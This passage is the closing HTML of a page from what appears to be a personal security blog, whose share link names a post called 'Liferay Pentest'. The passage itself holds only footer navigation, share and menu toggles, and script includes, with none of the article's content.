    <a class="icon" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2fdevme4f.github.io%2fposts%2f2023%2fliferay-pentest%2f&t=Liferay%20Pentest" aria-label="Hacker News">
      <i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i>
    </a>
  </li>
</ul>

    </div>

    <div id="actions-footer">
      
        <a id="menu-toggle" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;" aria-label="Menu">
          <i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
        <a id="toc-toggle" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;" aria-label="TOC">
          <i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share-toggle" class="icon" href="#" onclick="$('#share-footer').toggle();return false;" aria-label="Share">
          <i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" aria-label="Top of Page">
          <i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>


  <footer id="footer">
  <div class="footer-left">
    Copyright  &copy; 2024  devme4f blogs 
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
        <li><a href="/">Home</a></li>
         
        <li><a href="/posts">Archives</a></li>
         
        <li><a href="/tags">Tags</a></li>
         
        <li><a href="/about">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>


  </div>
</body>

<link rel="stylesheet" href=/lib/font-awesome/css/all.min.css>
<script src=/lib/jquery/jquery.min.js></script>
<script src=/js/main.js></script>

<script src=/js/code-copy.js></script>




</html>
